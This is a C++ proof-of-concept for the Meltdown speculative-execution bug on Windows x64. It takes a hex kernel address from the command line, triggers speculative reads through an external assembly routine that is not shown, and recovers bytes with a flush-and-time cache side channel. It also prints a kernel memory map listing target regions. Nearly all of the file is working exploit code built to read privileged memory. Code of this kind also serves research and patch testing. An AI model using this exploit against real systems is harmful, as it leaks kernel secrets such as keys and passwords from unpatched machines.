// demonstrate Meltdown bug for Windows x64
// Chris Lomont, Jan 9, 2018
// Visual Studio 2017, build in debug mode to prevent some things being optimized out
#include <iostream>
#include <algorithm>
#include <iomanip>
#include <string>
#include <intrin.h> // inline assembly functions
#include <excpt.h>  // for windows structured exception handling

using namespace std;

#define PAGE_SIZE 4096 // memory page size in bytes

// large piece of user memory for checking cache accesses
static uint8_t user_timing_array_base[256 * PAGE_SIZE * 2];

// a type used to determine most likely byte value from cache hits
typedef struct
{
	int value;     // value here
	int hit_count; // times this value was hit
} hit_count_t;

static hit_count_t histogram[256]; // hit counts for each byte 0-255

// get access time for the given address using the CPU cycle counter
static inline auto get_access_time(const uint8_t *addr)
{
	volatile int datum; // want to ensure compiler performs this
	auto time1 = __rdtsc();
	datum = *addr;
	_mm_mfence(); // memory barrier to ensure above completed
	auto time2 = __rdtsc();
	return time2 - time1;
}

// external assembly code to perform speculative code read
extern "C" void speculative_read(const void * attack_addr, const uint8_t * user_timing_array);

// try to read a byte speculatively
// fills in histogram
static void fill_histogram_with_speculative_read_timings(void * addr, int passes, int cache_hit_threshold, uint8_t * user_timing_array_base)
{
	// initialize histogram
	for (auto i = 0; i < 256; ++i)
	{
		histogram[i].hit_count = 0;
		histogram[i].value = i;
	}

	// execute speculative reads the requested number of times
	// tally best selection after each pass
	for (auto i = 0; i < passes; ++i)
	{
		// pick moving start to make timing more accurate
		// all local variables on stack hit one of these pages, so move them around
		auto user_timing_array = user_timing_array_base + (i & 255) * PAGE_SIZE;

		// set user_array to have known values for debugging
		for (auto i = 0; i < 256; ++i)
			user_timing_array[i] = i;

		// 1. flush cache lines
		for (auto i = 0; i < 256; ++i)
			_mm_clflush(&user_timing_array[i * PAGE_SIZE]);

		// 2. do the read, trap segment faults
		__try {
			// the external assembly code to do the speculative attack
			speculative_read(addr, user_timing_array);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{   // EXCEPTION_EXECUTE_HANDLER - code continues here
			// EXCEPTION_CONTINUE_EXECUTION to continue in code
			// cout << "Exception" << endl;
		}

		// 3. put cache timings into histogram
		for (auto j = 0; j < 256; ++j)
		{			
			auto time = get_access_time(&user_timing_array[j * PAGE_SIZE]);
			if (time <= cache_hit_threshold)
				histogram[j].hit_count++;
		}
	}
}

// determine difference between cached and uncached read timing
static auto determine_cache_timing(long passes, const uint8_t * timing_array)
{
	// time cache accesses - cost of first load outweighed by subsequent reads
	uint64_t cached = 0;
	for (auto i = 0; i < passes; ++i)
		cached += get_access_time(timing_array);

	// time uncached accesses
	uint64_t uncached = 0;
	for (auto i = 0; i < passes; ++i) 
	{
		_mm_clflush(timing_array);
		uncached += get_access_time(timing_array);
	}

	cached   /= passes;
	uncached /= passes;

	// threshold closer to cached time than uncached time
	auto threshold = (cached + uncached) / 2;

	cout << "Timing: cached " << cached << ", uncached " << uncached << ", threshold " << threshold << endl;

	return threshold;
}
#if 0
x64 kernel memory map
FFFF0800`00000000-FFFFF67F`FFFFFFFF 238TB   Unused System Space
FFFFF680`00000000-FFFFF6FF`FFFFFFFF 512GB   PTE Space
FFFFF700`00000000-FFFFF77F`FFFFFFFF 512GB   HyperSpace
FFFFF780`00000000-FFFFF780`00000FFF 4K      Shared System Page
FFFFF780`00001000-FFFFF7FF`FFFFFFFF 512GB - 4K  System Cache Working Set
FFFFF800`00000000-FFFFF87F`FFFFFFFF 512GB   Initial Loader Mappings
FFFFF880`00000000-FFFFF89F`FFFFFFFF 128GB   Sys PTEs
FFFFF8a0`00000000-FFFFF8bF`FFFFFFFF 128GB   Paged Pool Area
FFFFF900`00000000-FFFFF97F`FFFFFFFF 512GB   Session Space
FFFFF980`00000000-FFFFFa70`FFFFFFFF 1TB     Dynamic Kernel VA Space
FFFFFa80`00000000-*nt!MmNonPagedPoolStart - 1 6TB Max   PFN Database
*nt!MmNonPagedPoolStart-*nt!MmNonPagedPoolEnd 512GB Max   Non - Paged Pool
FFFFFFFF`FFc00000-FFFFFFFF`FFFFFFFF 4MB     HAL and Loader Mappings
#endif

int main(int argc, char *argv[])
{
	// address to start reading from
	void * addr = &user_timing_array_base;
	// number of steps to read
	uint64_t steps = 256;
	// memory step size
	uint64_t delta = 1;
	
	if (argc < 3)
	{ // usage
		cerr << "Usage:" << endl;
		cerr << "    hex_address size" << endl;
		cerr << "Ex: 0xFFFF080000000000 256" << endl;
		cerr << "Address of 0xFFFFFFFFFFFFFFFF does internal testing" << endl;
		return -1;
	}
	else
	{
		// parse args		
		addr = (void*)std::stoull(argv[1], nullptr, 16);
		steps = std::stoull(argv[2], nullptr);
		if (addr == (void*)0xFFFFFFFF'FFFFFFFF)
			addr = user_timing_array_base;
	}

	// determine timing values for cached and uncached reads
	constexpr auto timing_passes = 10000;
	auto cache_hit_threshold = determine_cache_timing(timing_passes, user_timing_array_base);

	for (auto i = 0; i < steps; ++i)
	{
		// times to count the address hit
		constexpr auto cycles = 1000; 

		// get histogram of most likely data bytes read
		fill_histogram_with_speculative_read_timings(addr, cycles, cache_hit_threshold, user_timing_array_base);

		// sort histogram to make most likely at index 0, 2nd at index 1, etc.
		// uses lambda to sort on hit_count
		sort(histogram, histogram + 256, [](const hit_count_t & a, const hit_count_t & b) -> bool {	return a.hit_count > b.hit_count; });

		// output address, hex byte, char, top score, 2nd score, 3rd score, etc
		cout << hex << addr << ": ";
		for (auto j = 0; j < 4; ++j)
		{
			auto value = histogram[j].value;
			cout << "0x" << setfill('0') << setw(2) << value << ' ' << (isprint(value) ? (char)value : ' ') << dec;
			cout << " (" << setw(4) << histogram[j].hit_count << "/" << cycles << ")   ";
		}
		cout << endl;

		// next byte address
		addr = ((uint8_t*)addr) + delta; 
	}

	return 0;
}